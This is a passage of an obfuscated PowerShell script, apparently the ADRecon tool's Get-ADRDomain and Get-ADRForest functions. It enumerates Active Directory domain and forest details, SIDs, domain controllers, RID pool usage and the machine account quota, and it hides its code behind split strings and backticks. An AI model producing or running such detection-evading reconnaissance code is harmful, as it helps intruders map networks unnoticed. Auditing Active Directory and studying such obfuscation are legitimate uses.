            If (-Not ${dO`MA`IN`ModE})
            {
                ${d`oMaINMO`DE} = ${a`DD`omAIN}."DOma`iN`Mo`DE"
            }

            ${OB`JV`AlU`Es} = @(("{1}{0}"-f 'me','Na'), ${ADdo`m`AIn}."Dn`sro`ot", ("{0}{1}" -f 'NetBI','OS'), ${aD`doM`AIN}."ne`TB`iosN`AMe", ("{0}{2}{3}{1}{4}" -f'Functio','eve','nal ','L','l'), ${do`mAi`NmO`De}, ("{0}{1}{2}" -f'Domai','n','SID'), ${aD`DoM`AIn}."DoM`Ai`NSId"."v`ALUE")

            For (${I} = 0; ${i} -lt $(${O`BJV`AluEs}."cO`UnT"); ${i}++)
            {
                ${o`Bj} = &("{0}{1}{2}"-f'Ne','w-Ob','ject') ("{1}{0}{2}" -f'jec','PSOb','t')
                ${O`Bj} | &("{0}{1}{2}" -f'Ad','d-Memb','er') -MemberType ("{2}{3}{1}{0}" -f'y','ert','N','oteProp') -Name ("{0}{2}{1}" -f 'C','y','ategor') -Value ${oBJv`A`LuEs}[${I}]
                ${O`BJ} | &("{0}{1}{2}" -f 'Add-M','embe','r') -MemberType ("{3}{1}{0}{2}"-f 'eP','t','roperty','No') -Name ("{1}{0}"-f'alue','V') -Value ${OB`jVA`LUEs}[${I}+1]
                ${I}++
                ${DOM`AIno`Bj} += ${O`BJ}
            }
            &("{0}{1}{2}{3}" -f'R','emove-V','ari','able') ("{0}{2}{1}{3}"-f 'Dom','n','ai','Mode')

            For(${i}=0; ${I} -lt ${a`D`DOmAIn}."rePL`icA`d`iRE`C`TOrysERVErS"."Co`UnT"; ${i}++)
            {
                ${O`BJ} = &("{1}{0}{2}"-f 'ew-Obje','N','ct') ("{0}{1}"-f'PSOb','ject')
                ${O`BJ} | &("{1}{0}{2}" -f'Membe','Add-','r') -MemberType ("{0}{3}{1}{2}"-f 'Not','Prop','erty','e') -Name ("{2}{1}{0}"-f 'gory','ate','C') -Value ("{1}{2}{0}{4}{3}"-f 'in Contro','D','oma','er','ll')
                ${O`BJ} | &("{1}{2}{0}" -f 'ember','Add-','M') -MemberType ("{2}{0}{1}{3}"-f 'otePro','p','N','erty') -Name ("{1}{0}" -f'alue','V') -Value ${A`DD`OM`Ain}."r`Ep`LIcADIRE`cTory`SErVers"[${I}]
                ${Do`Ma`INObJ} += ${O`BJ}
            }
            For(${i}=0; ${I} -lt ${aDd`o`MaiN}."R`EADOnLY`Re`pLiCAd`I`ReCtOrY`S`e`RVErs"."C`ouNT"; ${i}++)
            {
                ${O`BJ} = &("{2}{1}{0}" -f 't','ec','New-Obj') ("{0}{1}{2}" -f'PSO','bj','ect')
                ${O`BJ} | &("{2}{1}{0}" -f'mber','Me','Add-') -MemberType ("{3}{1}{0}{2}"-f'r','eP','operty','Not') -Name ("{2}{0}{1}" -f'a','tegory','C') -Value ("{5}{6}{4}{3}{8}{7}{1}{2}{0}" -f'er','ntr','oll','ai','Dom','Rea','d Only ','o','n C')
                ${O`Bj} | &("{2}{0}{1}"-f 'dd-M','ember','A') -MemberType ("{2}{0}{3}{1}" -f'e','roperty','Not','P') -Name ("{0}{1}"-f 'Valu','e') -Value ${a`dD`omAin}."r`Eadonlyr`ePliCadiR`E`cto`RYSeRVErS"[${I}]
                ${d`OmAIno`BJ} += ${o`BJ}
            }

            Try
            {
                ${a`dFOr`eST} = &("{1}{2}{0}" -f 'rest','Get-ADF','o') ${AdD`oM`AiN}."f`ORe`st"
            }
            Catch
            {
                &("{1}{3}{0}{2}" -f 'Verbos','Write','e','-') ("{9}{4}{8}{7}{1}{3}{5}{13}{12}{10}{6}{2}{0}{11}"-f'o','m','st C','ain] E','Get-AD','rro','e','Do','R','[','or','ntext','ting F','r get')
                &("{3}{2}{1}{0}"-f 'se','o','-Verb','Write') "[EXCEPTION] $($_.Exception.Message) "
            }

            If (-Not ${a`d`ForEsT})
            {
                Try
                {
                    ${a`dF`ORest} = &("{0}{2}{1}{3}"-f 'G','D','et-A','Forest') -Server ${DOM`AI`N`CO`Nt`ROlLeR}
                }
                Catch
                {
                    &("{1}{2}{0}"-f 'te-Warning','W','ri') ("{7}{5}{6}{0}{1}{2}{3}{4}"-f'oma','in] Erro','r ge','tting Forest ','Context','-AD','RD','[Get')
                    &("{0}{1}{2}{3}"-f'W','rite-','Ver','bose') "[EXCEPTION] $($_.Exception.Message) "
                }
            }
            If (${a`Dfor`est})
            {
                ${DOmAI`N`creA`TiON} = &("{0}{1}{2}"-f'G','et-ADObje','ct') -SearchBase "$($ADForest.PartitionsContainer)" -LDAPFilter "(&(objectClass=crossRef)(systemFlags=3)(Name=$($ADDomain.Name)))" -Properties ("{2}{1}{0}"-f'Created','en','wh')
                If (-Not ${D`o`mAin`cREaT`iON})
                {
                    ${doma`I`Ncr`EA`TioN} = &("{2}{0}{1}"-f'ADO','bject','Get-') -SearchBase "$($ADForest.PartitionsContainer)" -LDAPFilter "(&(objectClass=crossRef)(systemFlags=3)(Name=$($ADDomain.NetBIOSName)))" -Properties ("{0}{3}{1}{2}"-f'w','Cre','ated','hen')
                }
                &("{2}{1}{3}{0}" -f 'e','ariab','Remove-V','l') ("{0}{1}{2}" -f 'ADF','ore','st')
            }
            
            Try
            {
                ${R`I`DM`ANAGEr} = &("{3}{1}{2}{0}"-f 'DObject','e','t-A','G') -Identity "CN=RID Manager$,CN=System,$($ADDomain.DistinguishedName) " -Properties ("{1}{3}{2}{0}{4}" -f 'o','rIDA','eP','vailabl','ol')
                ${Ri`dP`ROpEr`Ty} = ${rId`m`ANaGer}."R`id`AV`AIlABLEpoOl"
                [int32] ${t`oTals`iDS} = $(${riDp`R`oPe`Rty}) / ( $94sAg5::("{0}{1}" -f'P','ow').Invoke(2,32))
                [int64] ${TEmp`6`4vAL} = ${TOTA`LS`iDs} * ( ( Get-VariaBlE  94Sag5 ).vaLue::("{1}{0}"-f 'w','Po').Invoke(2,32))
                ${RI`ds`IsSu`ED} = [int32]($(${RId`pROPe`Rty}) - ${te`Mp`64VAL})
                ${RiDS`ReMAI`Ni`Ng} = ${tO`TaL`Sids} - ${RID`sISsU`ED}
                &("{3}{2}{0}{1}" -f'bl','e','aria','Remove-V') ("{2}{1}{3}{0}"-f 'r','IDMa','R','nage')
                &("{2}{1}{3}{0}"-f'ariable','ove-','Rem','V') ("{1}{0}{3}{2}" -f 'IDpro','R','erty','p')
                &("{1}{4}{3}{2}{0}" -f 'le','Re','ab','-Vari','move') ("{2}{1}{0}" -f'DS','I','totalS')
                &("{2}{3}{1}{4}{0}" -f'e','ve-V','R','emo','ariabl') ("{2}{1}{0}" -f'64val','p','tem')
            }
            Catch
            {
                &("{1}{3}{0}{2}" -f'rn','Write-W','ing','a') "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($ADDomain.DistinguishedName) "
                &("{0}{1}{2}{3}"-f'Write','-V','e','rbose') "[EXCEPTION] $($_.Exception.Message) "
            }
            If (${d`O`MaiNC`REaTIOn})
            {
                ${O`BJ} = &("{0}{2}{1}{3}" -f'Ne','bje','w-O','ct') ("{0}{2}{1}" -f'PSO','ect','bj')
                ${O`BJ} | &("{1}{2}{0}"-f 'r','Add-M','embe') -MemberType ("{0}{1}{2}"-f 'No','teProp','erty') -Name ("{1}{0}{2}" -f 'o','Categ','ry') -Value ("{0}{2}{3}{1}"-f'Cre','ate','ation',' D')
                ${O`Bj} | &("{0}{1}{2}" -f 'Add-','Memb','er') -MemberType ("{0}{2}{1}" -f 'NotePrope','y','rt') -Name ("{0}{1}"-f 'Val','ue') -Value ${dOMAI`Nc`R`EatI`On}."w`HenC`R`EATed"
                ${D`OmAIN`ObJ} += ${O`Bj}
                &("{3}{0}{2}{4}{1}"-f 'emove-V','e','a','R','riabl') ("{2}{0}{1}"-f 'nCre','ation','Domai')
            }

            ${o`BJ} = &("{1}{2}{0}" -f 'Object','N','ew-') ("{0}{1}" -f 'P','SObject')
            ${o`Bj} | &("{1}{0}{2}" -f '-Membe','Add','r') -MemberType ("{0}{2}{3}{1}" -f 'Note','erty','P','rop') -Name ("{1}{0}" -f'gory','Cate') -Value ("{4}{2}{1}{3}{5}{0}"-f 'ota','Acc','hine','ount','ms-DS-Mac','Qu')
            ${o`BJ} | &("{0}{2}{1}"-f'Add-Memb','r','e') -MemberType ("{2}{0}{3}{1}" -f'eP','erty','Not','rop') -Name ("{1}{0}"-f'lue','Va') -Value $((&("{1}{2}{0}"-f'ect','Get-','ADObj') -Identity (${ad`DoM`AIn}."dI`sti`Ng`UIshedna`ME") -Properties ("{2}{4}{3}{1}{0}" -f 'a','tQuot','m','MachineAccoun','s-DS-')).'ms-DS-MachineAccountQuota')
            ${D`omaiN`obj} += ${O`BJ}

            If (${ridS`i`s`sUed})
            {
                ${o`BJ} = &("{0}{1}{2}" -f 'New','-Objec','t') ("{2}{0}{1}" -f'bj','ect','PSO')
                ${o`BJ} | &("{2}{1}{0}" -f 'r','-Membe','Add') -MemberType ("{0}{3}{1}{2}"-f 'No','ope','rty','tePr') -Name ("{2}{1}{0}"-f 'y','ategor','C') -Value ("{1}{2}{0}"-f'sued','R','IDs Is')
                ${O`Bj} | &("{1}{2}{0}"-f'ember','Add-','M') -MemberType ("{2}{1}{0}" -f'erty','Prop','Note') -Name ("{1}{0}" -f'lue','Va') -Value ${RiDS`IssU`ed}
                ${d`OmaI`NoBJ} += ${O`BJ}
                &("{3}{1}{0}{2}" -f 'move-Variab','e','le','R') ("{2}{0}{1}" -f 'IDsIss','ued','R')
            }
            If (${RiDSr`eM`AI`NInG})
            {
                ${o`BJ} = &("{2}{1}{0}"-f 'bject','w-O','Ne') ("{0}{1}"-f 'PSObj','ect')
                ${o`BJ} | &("{1}{2}{0}"-f'mber','Add-','Me') -MemberType ("{3}{0}{2}{1}" -f'otePro','y','pert','N') -Name ("{2}{0}{1}"-f'tego','ry','Ca') -Value ("{0}{1}{2}"-f'R','IDs Remaini','ng')
                ${o`Bj} | &("{0}{2}{1}" -f 'Add','ember','-M') -MemberType ("{2}{1}{0}"-f 'y','t','NoteProper') -Name ("{0}{1}"-f'Va','lue') -Value ${rIDsr`E`ma`INing}
                ${dO`maino`Bj} += ${o`BJ}
                &("{0}{2}{3}{4}{1}"-f'R','riable','em','ove-','Va') ("{1}{0}{2}" -f 'sRemaini','RID','ng')
            }
        }
    }

    If (${Met`h`oD} -eq ("{0}{1}"-f 'LD','AP'))
    {
        If (${c`REd`eNTial} -ne  (GEt-VARIaBLe NK5p).vAlue::"EM`ptY")
        {
            ${d`omAiN`FqDN} = &("{2}{3}{1}{0}" -f'FQDN','to','Get','-DN')(${obj`d`OMaIn}."D`ISTi`NguIs`he`dName")
            ${DO`Ma`INc`On`TEXT} = &("{2}{0}{1}" -f 'ew','-Object','N') ("{1}{4}{3}{14}{0}{5}{8}{16}{9}{12}{7}{15}{17}{10}{11}{13}{2}{6}" -f'cto','System','C','r','.Di','rySer','ontext','Dire','v','v','rect','o','e','ry','e','cto','ices.Acti','ry.Di')(("{1}{2}{0}" -f 'n','Do','mai'),$(${dOmaI`N`FQ`Dn}),$(${Crede`NT`IaL}."U`sE`RnAME"),$(${cRed`eN`T`iAl}.("{2}{5}{1}{4}{0}{3}"-f'a','etworkCreden','G','l','ti','etN').Invoke()."paSSw`orD"))
            Try
            {
                ${A`ddO`Main} =   ( gET-vARIabLE  lBFUd2 -va )::("{0}{1}{2}"-f 'GetDoma','i','n').Invoke(${d`oMaIncOntE`XT})
            }
            Catch
            {
                &("{3}{0}{2}{1}" -f't','ng','e-Warni','Wri') ("{4}{7}{3}{5}{0}{9}{1}{12}{6}{11}{8}{2}{10}"-f 'r',' getting Do','t','n] E','[Get-ADR','r','i','Domai','n','or','ext','n Co','ma')
                &("{0}{1}{2}{3}" -f'Wr','i','te-Verb','ose') "[EXCEPTION] $($_.Exception.Message) "
                Return ${N`Ull}
            }
            &("{2}{1}{0}" -f 'iable','move-Var','Re') ("{2}{3}{4}{1}{0}"-f'xt','e','Dom','ainCon','t')
            
            Try
            {
                ${sEar`CH`pAth} = ('CN=R'+'ID'+' '+"Manager$,CN=System")
                ${OB`jSeA`RChp`ATh} = &("{0}{1}{2}"-f 'N','ew-','Object') ("{2}{5}{1}{3}{4}{6}{0}{7}"-f'Ent','m.DirectoryServic','Syst','es','.Directo','e','ry','ry') "LDAP://$($DomainController)/$SearchPath,$($objDomain.distinguishedName)", ${Cre`dE`N`TiAl}."u`s`eRnaME",${c`RE`DENTiAL}.("{4}{3}{0}{2}{1}"-f 'etwo','tial','rkCreden','tN','Ge').Invoke()."pa`sS`worD"
                ${o`Bj`SeARc`H`ErPaTh} = &("{1}{2}{0}{3}" -f 'je','New','-Ob','ct') ("{7}{0}{2}{6}{1}{3}{5}{4}" -f'rvi','ea','ces.Directory','r','r','che','S','System.DirectorySe') ${oBJsE`ARcHPA`Th}
                ${oB`jSea`RChE`RPAtH}."PrOp`ER`TieST`OLoAd".("{0}{1}"-f'AddRang','e').Invoke((("{3}{2}{0}{1}" -f'lablepo','ol','i','ridava')))
                ${Objs`EarC`H`ErR`esULT} = ${OBjsEA`RchE`RP`ATH}.("{0}{1}"-f'F','indAll').Invoke()
                ${rI`Dp`ROPer`Ty} = ${objSeA`RcHer`R`ESUlt}."p`R`oP`ErTIES"."r`IDA`VailAB`leP`Ool"
                [int32] ${To`TaLSi`Ds} = $(${RIDpRo`p`Erty}) / (  $94sAG5::("{0}{1}"-f'Po','w').Invoke(2,32))
                [int64] ${t`eMp`64v`Al} = ${to`T`ALsIDs} * (  ( ls VarIABLe:94saG5  ).ValUe::("{1}{0}" -f'ow','P').Invoke(2,32))
                ${R`Idsissu`eD} = [int32]($(${RIdp`Rop`e`RTy}) - ${Te`Mp6`4`VAL})
                ${RIDSReMA`I`NINg} = ${TO`TAlS`iDs} - ${r`id`SISS`UEd}
                &("{2}{0}{1}{3}"-f'e-V','ar','Remov','iable') ("{1}{0}{2}"-f'archPat','Se','h')
                ${oBjS`eaR`C`H`PatH}.("{1}{0}{2}" -f'is','D','pose').Invoke()
                ${OB`jSEa`RCH`ErPath}.("{2}{1}{0}" -f'pose','is','D').Invoke()
                ${o`B`J`sEAR`cHErResULt}.("{1}{2}{0}"-f'e','Disp','os').Invoke()
                &("{0}{2}{3}{1}" -f 'R','riable','emov','e-Va') ("{2}{3}{1}{0}"-f 'erty','op','RI','Dpr')
                &("{3}{1}{0}{2}" -f 'ia','r','ble','Remove-Va') ("{2}{0}{1}"-f 'talSID','S','to')
                &("{2}{0}{1}"-f'e-Varia','ble','Remov') ("{1}{0}{2}"-f'e','t','mp64val')
            }
            Catch
            {
                &("{0}{2}{1}" -f'Writ','rning','e-Wa') "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($SearchPath),$($objDomain.distinguishedName) "
                &("{2}{1}{3}{0}" -f'erbose','ite-','Wr','V') "[EXCEPTION] $($_.Exception.Message) "
            }
            Try
            {
                ${F`OReSt`cOnT`ext} = &("{1}{2}{0}{3}"-f 'c','New-O','bje','t') ("{6}{8}{0}{10}{1}{5}{4}{9}{3}{7}{11}{2}" -f 'tem.D','t','ontext','eDirectory.Dir','vices.','orySer','S','ec','ys','Activ','irec','toryC')(("{1}{0}" -f'orest','F'),$(${AD`D`OmAIN}."F`OR`EsT"),$(${c`R`EDeNT`iAl}."useRNa`me"),$(${Cr`E`DeNTIaL}.("{3}{1}{2}{0}"-f'ial','Net','workCredent','Get').Invoke()."P`As`sWORD"))
                ${aDf`o`REst} =   ( GEt-vArIablE  ("Yd"+"lZcG") ).ValuE::("{1}{2}{0}" -f 't','GetFor','es').Invoke(${ForESTCo`NtE`xt})
            }
            Catch
            {
                &("{0}{3}{1}{2}" -f 'Wr','te-','Warning','i') ("{2}{0}{4}{3}{7}{6}{5}{1}"-f 't','t','[Ge',' getting Fo','-ADRDomain] Error','x','st Conte','re')
                &("{1}{2}{0}" -f'e','Write-V','erbos') "[EXCEPTION] $($_.Exception.Message) "
            }
            If (${f`o`REStC`ONTExT})
            {
                &("{0}{1}{2}"-f 'R','emove-Vari','able') ("{3}{1}{0}{2}" -f'on','C','text','Forest')
            }
            If (${aD`For`EsT})
            {
                ${g`loBal`CatALOG} = ${a`dFOre`sT}.("{3}{1}{2}{0}" -f 'og','Global','Catal','Find').Invoke()
            }
            If (${GL`obA`LCaT`AlOG})
            {
                ${dN} = "GC://$($GlobalCatalog.IPAddress)/$($objDomain.distinguishedname)"
                Try
                {
                    ${a`DO`BJ`ECt} = &("{1}{2}{0}" -f 'ject','New-O','b') -TypeName ("{0}{2}{8}{1}{6}{4}{3}{7}{5}" -f'S','Direc','yste','es.Dire','rvic','y','torySe','ctoryEntr','m.') -ArgumentList ($(${DN}),$(${cREd`EN`TIaL}."U`sERNAmE"),$(${C`R`EdEnTiAl}.("{1}{2}{3}{0}"-f 'ial','Ge','tNet','workCredent').Invoke()."pa`S`SWORD"))
                    ${aDdo`main`s`ID} = &("{2}{1}{0}"-f 'ject','Ob','New-') ("{1}{8}{7}{10}{6}{5}{4}{3}{9}{2}{0}" -f 'ier','Sy','ityIdentif','pal','nci','ri','ity.P','Se','stem.','.Secur','cur')(${Ad`O`Bje`CT}."ObJe`cT`SId"[0], 0)
                    ${A`d`oBjeCT}.("{1}{2}{0}" -f 'pose','D','is').Invoke()
                }
                Catch
                {
                    &("{4}{0}{3}{1}{2}" -f 'W','rn','ing','a','Write-') "[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                    &("{1}{2}{3}{0}" -f'te-Verbose','W','r','i') "[EXCEPTION] $($_.Exception.Message) "
                    ${ADd`OMai`Ns`ID} = &("{1}{2}{0}" -f't','New','-Objec') ("{3}{0}{4}{7}{2}{8}{6}{5}{1}"-f 't','ntifier','ncipal.Security','Sys','em.Sec','e','d','urity.Pri','I')(${oB`jDOm`A`IN}."ObJe`cts`ID"[0], 0)
                }
            }
            Else
            {
                ${ADDo`ma`IN`Sid} = &("{0}{1}{2}"-f 'New','-','Object') ("{6}{9}{7}{1}{10}{4}{0}{5}{2}{8}{3}"-f 'Security','urity.Prin','ti','r','al.','Iden','System.','c','fie','Se','cip')(${OBJDOm`A`in}."OBJE`C`TsId"[0], 0)
            }
        }
        Else
        {
            ${a`DD`omaIn} =  (  variAbLE lBfuD2).vAlUe::("{4}{1}{3}{0}{2}" -f 'entD','tC','omain','urr','Ge').Invoke()
            ${Ad`FOreSt} =  $YDLzcG::("{1}{2}{0}{3}"-f'rren','G','etCu','tForest').Invoke()
            Try
            {
                ${g`LO`BAl`CatalOg} = ${adfO`R`e`ST}.("{5}{0}{4}{3}{2}{1}" -f 'n','log','balCata','lo','dG','Fi').Invoke()
                ${D`N} = "GC://$($GlobalCatalog)/$($objDomain.distinguishedname)"
                ${AD`Ob`JE`ct} = &("{2}{1}{0}"-f'ject','w-Ob','Ne') -TypeName ("{7}{6}{9}{8}{5}{2}{0}{4}{3}{1}" -f 'ecto','ry','es.Dir','t','ryEn','ryServic','te','Sys','.Directo','m') -ArgumentList (${d`N})
                ${a`D`domAIns`Id} = &("{0}{1}{2}{3}" -f 'Ne','w-','Ob','ject') ("{6}{3}{12}{9}{10}{11}{7}{1}{0}{4}{8}{2}{5}"-f'ty','uri','i','t','I','fier','Sys','Sec','dent','ec','urity.Principa','l.','em.S')(${aDoB`JEcT}."OB`JeCts`Id"[0], 0)
                ${A`doBj`ECt}.("{1}{0}{2}" -f'os','disp','e').Invoke()
            }
            Catch
            {
                &("{1}{0}{3}{2}" -f 'ar','Write-W','g','nin') "[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                &("{1}{2}{0}{3}"-f'erb','Wr','ite-V','ose') "[EXCEPTION] $($_.Exception.Message) "
                ${ad`dOMain`siD} = &("{2}{0}{1}{3}" -f 'w','-Obje','Ne','ct') ("{7}{10}{8}{12}{1}{2}{3}{13}{6}{5}{0}{9}{4}{11}"-f 'ty','.P','rincipa','l.','ntifie','uri','c','S','Sec','Ide','ystem.','r','urity','Se')(${o`Bjdo`Ma`in}."Objec`T`sID"[0], 0)
            }
            
            Try
            {
                ${Ri`DmAna`gEr} = ([ADSI]"LDAP://CN=RID Manager$,CN=System,$($objDomain.distinguishedName) ")
                ${rIDp`R`OPErty} = ${o`Bjd`OM`Ain}.("{2}{3}{4}{0}{1}"-f 'erT','oInt64','ConvertL','argeIn','teg').Invoke(${rID`mANag`er}."PropEr`T`iES"."RiDaVaIl`AbLEpo`OL"."V`ALue")
                [int32] ${t`otaLSi`dS} = $(${riDp`RO`peRTY}) / (  ( GEt-CHIlDIteM VAriable:94sag5 ).Value::("{0}{1}"-f'Po','w').Invoke(2,32))
                [int64] ${temP6`4`VaL} = ${TO`Tal`Sids} * (  $94sAg5::("{1}{0}"-f 'ow','P').Invoke(2,32))
                ${r`Id`SIsSUEd} = [int32]($(${RID`PrOp`Er`TY}) - ${TeM`p64`VAL})
                ${r`iDSR`emA`i`NIng} = ${t`ota`lSIdS} - ${R`ids`i`SsueD}
                &("{1}{3}{0}{2}"-f'ariabl','Rem','e','ove-V') ("{0}{2}{1}" -f'RI','anager','DM')
                &("{2}{4}{1}{3}{0}" -f 'le','ria','Remove-V','b','a') ("{0}{2}{1}{3}" -f'RIDpr','p','o','erty')
                &("{1}{2}{4}{3}{0}"-f'ble','R','emove-Va','a','ri') ("{1}{0}{2}"-f 'lSI','tota','DS')
                &("{4}{3}{2}{0}{1}"-f 'bl','e','ia','Var','Remove-') ("{0}{1}{2}" -f't','emp','64val')
            }
            Catch
            {
                &("{0}{2}{1}"-f'Write-','ng','Warni') "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($SearchPath),$($objDomain.distinguishedName) "
                &("{1}{0}{2}"-f '-Ve','Write','rbose') "[EXCEPTION] $($_.Exception.Message) "
            }
        }

        If (${aDd`o`mAIn})
        {
            ${D`oma`INOBj} = @()

            
            ${Fl`AD} = @{
	            0 = ("{0}{1}{2}" -f'W','indow','s2000');
	            1 = ("{0}{2}{4}{3}{1}" -f 'Wind','terim','ows2003','In','/');
	            2 = ("{2}{1}{0}"-f '03','indows20','W');
	            3 = ("{2}{1}{0}{3}"-f'w','o','Wind','s2008');
	            4 = ("{2}{0}{1}"-f'indow','s2008R2','W');
	            5 = ("{0}{2}{3}{1}"-f 'Win','012','d','ows2');
	            6 = ("{0}{2}{4}{3}{1}"-f 'Wind','2R2','ows2','1','0');
	            7 = ("{2}{0}{1}" -f'ws','2016','Windo')
            }
            ${D`Om`AinMO`De} = ${FL`AD}[  $0528HS::("{0}{2}{1}" -f 'ToIn','32','t').Invoke(${O`BJdOM`AiN`ROoT`dSE}."doMAIn`FU`N`ctIoNALI`Ty",10)] + ("{0}{1}"-f'Doma','in')
            &("{3}{0}{2}{1}" -f'ria','le','b','Remove-Va') ("{0}{1}"-f 'FL','AD')

            ${ObJ`V`ALU`ES} = @(("{1}{0}" -f'ame','N'), ${ad`DOm`AIn}."n`AMe", ("{1}{0}" -f'etBIOS','N'), ${o`BJDO`MaiN}."dc"."val`Ue", ("{3}{1}{0}{4}{2}" -f'ional ','nct','l','Fu','Leve'), ${doMA`I`NM`ODe}, ("{1}{2}{0}" -f'ID','D','omainS'), ${a`Ddo`MaI`NSId}."vA`lue")

            For (${i} = 0; ${i} -lt $(${OB`Jv`AlUES}."COu`Nt"); ${I}++)
            {
                ${O`Bj} = &("{2}{0}{1}" -f'-O','bject','New') ("{1}{0}{2}"-f'Objec','PS','t')
                ${o`Bj} | &("{1}{2}{0}" -f'mber','Ad','d-Me') -MemberType ("{2}{3}{1}{0}"-f 'y','ert','No','teProp') -Name ("{0}{1}{2}" -f'Cat','ego','ry') -Value ${OB`j`ValueS}[${I}]
                ${O`BJ} | &("{0}{1}{3}{2}" -f'Add','-','ber','Mem') -MemberType ("{0}{3}{1}{2}" -f 'NoteP','t','y','roper') -Name ("{1}{0}" -f'ue','Val') -Value ${ObJV`AlU`eS}[${I}+1]
                ${I}++
                ${dom`AINO`Bj} += ${o`BJ}
            }
            &("{1}{2}{0}{3}" -f'move-Vari','R','e','able') ("{2}{1}{0}"-f 'Mode','main','Do')

            For(${i}=0; ${I} -lt ${AdDOm`A`IN}."DO`m`AIncO`NtRol`leRs"."C`OUnt"; ${I}++)
            {
                ${o`Bj} = &("{1}{2}{0}" -f'ject','New-','Ob') ("{1}{0}" -f'Object','PS')
                ${O`BJ} | &("{1}{0}{2}"-f 'Memb','Add-','er') -MemberType ("{0}{2}{3}{1}"-f 'NoteP','erty','ro','p') -Name ("{2}{1}{0}"-f 'egory','t','Ca') -Value ("{0}{1}{3}{2}" -f 'D','oma','Controller','in ')
                ${O`BJ} | &("{1}{2}{0}"-f'r','A','dd-Membe') -MemberType ("{0}{3}{2}{1}" -f 'N','ty','r','otePrope') -Name ("{0}{1}" -f 'Val','ue') -Value ${a`DDoM`A`in}."DO`mAI`NCon`T`RoLLE`RS"[${i}]
                ${DoMa`I`NobJ} += ${o`Bj}
            }

            ${O`Bj} = &("{0}{2}{3}{1}"-f 'N','ct','ew-','Obje') ("{0}{2}{1}" -f'P','bject','SO')
            ${o`BJ} | &("{1}{0}{2}" -f 'mbe','Add-Me','r') -MemberType ("{1}{2}{0}{3}" -f 'eProp','No','t','erty') -Name ("{0}{1}{2}"-f 'C','ateg','ory') -Value ("{1}{0}{3}{2}" -f'tio','Crea','ate','n D')
            ${o`Bj} | &("{0}{2}{1}"-f 'Add','r','-Membe') -MemberType ("{1}{2}{0}"-f 'y','NoteProp','ert') -Name ("{0}{1}" -f 'Val','ue') -Value ${Obj`Do`maIN}."wHENcR`e`ATED"."va`Lue"
            ${D`omAI`NOBJ} += ${o`Bj}

            ${o`BJ} = &("{1}{0}{3}{2}"-f'ew-Ob','N','ect','j') ("{0}{2}{1}" -f 'PS','ct','Obje')
            ${o`Bj} | &("{1}{0}{2}"-f'-Memb','Add','er') -MemberType ("{1}{0}{2}{3}" -f'ePr','Not','ope','rty') -Name ("{1}{0}{2}" -f 'ate','C','gory') -Value ("{5}{3}{2}{4}{1}{0}" -f 'uota','AccountQ','S-M','-D','achine','ms')
            ${O`BJ} | &("{2}{0}{1}"-f'-Mem','ber','Add') -MemberType ("{1}{0}{2}" -f'eP','Not','roperty') -Name ("{1}{0}" -f 'alue','V') -Value ${oBj`do`MAIN}.'ms-DS-MachineAccountQuota'."vA`LuE"
            ${domaI`N`obJ} += ${O`BJ}

            If (${ridSI`Ss`UEd})
            {
                ${o`BJ} = &("{0}{1}{2}"-f 'Ne','w-Ob','ject') ("{1}{0}"-f'ject','PSOb')
                ${O`BJ} | &("{2}{1}{0}" -f 'er','b','Add-Mem') -MemberType ("{2}{0}{1}"-f'ro','perty','NoteP') -Name ("{0}{2}{1}"-f'Cat','y','egor') -Value ("{2}{0}{3}{1}" -f 'Ds Iss','d','RI','ue')
                ${o`BJ} | &("{0}{1}{2}" -f'A','dd-Memb','er') -MemberType ("{1}{3}{2}{0}" -f 'perty','N','Pro','ote') -Name ("{0}{1}" -f 'Valu','e') -Value ${Rid`sI`s`sued}
                ${d`OmA`iN`OBJ} += ${o`Bj}
                &("{1}{2}{3}{0}" -f'le','Rem','ove-Varia','b') ("{2}{1}{0}"-f'ed','DsIssu','RI')
            }
            If (${rI`dSrEMai`Ni`Ng})
            {
                ${o`Bj} = &("{1}{2}{0}"-f '-Object','N','ew') ("{2}{1}{0}" -f 'ect','bj','PSO')
                ${o`Bj} | &("{1}{2}{0}" -f 'r','Add-','Membe') -MemberType ("{0}{1}{2}" -f'No','teP','roperty') -Name ("{0}{2}{1}" -f 'C','ory','ateg') -Value ("{1}{0}{2}{3}"-f 'IDs ','R','R','emaining')
                ${O`Bj} | &("{1}{0}{2}{3}" -f'd','Ad','-Memb','er') -MemberType ("{1}{2}{0}" -f'y','N','otePropert') -Name ("{1}{0}"-f'e','Valu') -Value ${rId`Sr`EmaIN`i`Ng}
                ${dOm`A`iN`Obj} += ${O`Bj}
                &("{3}{0}{1}{2}" -f 'i','ab','le','Remove-Var') ("{1}{2}{0}"-f'ing','RIDs','Remain')
            }
        }
    }

    If (${d`OmainO`Bj})
    {
        Return ${D`o`MAiNobJ}
    }
    Else
    {
        Return ${nU`Ll}
    }
}

Function GEt-A`DrF`OResT
{

    param(
        [Parameter(mANDATORy = ${T`RuE})]
        [string] ${M`eTHoD},

        [Parameter(manDATOrY = ${f`AlSE})]
        [DirectoryServices.DirectoryEntry] ${oB`jDoM`AIN},

        [Parameter(MAndAtOrY = ${f`AlsE})]
        [DirectoryServices.DirectoryEntry] ${oBj`DOMA`I`NroOt`d`sE},

        [Parameter(mandAtORY = ${F`AL`sE})]
        [string] ${dom`AIn`cOnt`ROllEr},

        [Parameter(MAndATorY = ${Fa`lse})]
        [Management.Automation.PSCredential] ${C`Re`DeNT`iAl} =  (Gci vAriaBle:nk5p ).VaLuE::"eM`pty"
    )

    If (${mET`HoD} -eq ("{0}{1}" -f 'A','DWS'))
    {
        Try
        {
            ${ad`DOmA`In} = &("{3}{0}{2}{1}" -f 'et-ADDom','n','ai','G')
        }
        Catch
        {
            &("{1}{2}{0}"-f 'rning','Wr','ite-Wa') ("{3}{7}{8}{0}{1}{4}{9}{5}{11}{6}{2}{10}" -f'ro','r ge','Conte','[Get-','t',' ','omain ','ADR','Forest] Er','ting','xt','D')
            &("{1}{2}{0}"-f'e','Write-Verbo','s') "[EXCEPTION] $($_.Exception.Message) "
            Return ${nU`ll}
        }

        Try
        {
            ${a`DfO`RESt} = &("{3}{0}{2}{1}"-f '-ADFor','st','e','Get') ${ad`DOMa`iN}."F`orEST"
        }
        Catch
        {
